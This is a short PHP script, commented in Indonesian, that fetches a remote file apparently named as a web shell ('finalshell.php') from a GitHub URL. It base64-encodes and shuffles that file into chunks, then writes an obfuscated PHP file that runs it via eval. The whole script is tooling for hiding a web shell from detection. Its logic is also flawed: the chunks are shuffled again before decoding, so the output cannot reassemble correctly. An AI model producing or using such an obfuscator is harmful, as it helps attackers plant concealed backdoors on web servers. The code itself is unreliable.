<?php
// URL file PHP di GitHub
$url = 'https://raw.githubusercontent.com/sundapridee/sunda/refs/heads/main/finalshell.php';

// Ambil isi file dari URL
$code = file_get_contents($url);
if ($code === false) {
    die("Gagal mengambil file dari URL: $url\n");
}

// Encode ke Base64
$base64 = base64_encode($code);

// Bagi string menjadi potongan 50 karakter dan acak
$chunks = str_split($base64, 50);
shuffle($chunks);

// Buat nama variabel acak
$varName = 'x'.substr(md5(rand()),0,8);

// Buat file output obfuscated
$outputFile = 'finalshell_github_obf.php';
file_put_contents($outputFile, "<?php\n".
    "// Obfuscated Base64 chunks dari GitHub\n".
    "\${$varName} = ['" . implode("','", $chunks) . "'];\n".
    "shuffle(\${$varName});\n".
    "\$code = implode('', \${$varName});\n".
    "eval(base64_decode(\$code));\n".
    "?>");

echo "File obfuscated berhasil dibuat: $outputFile\n";
?>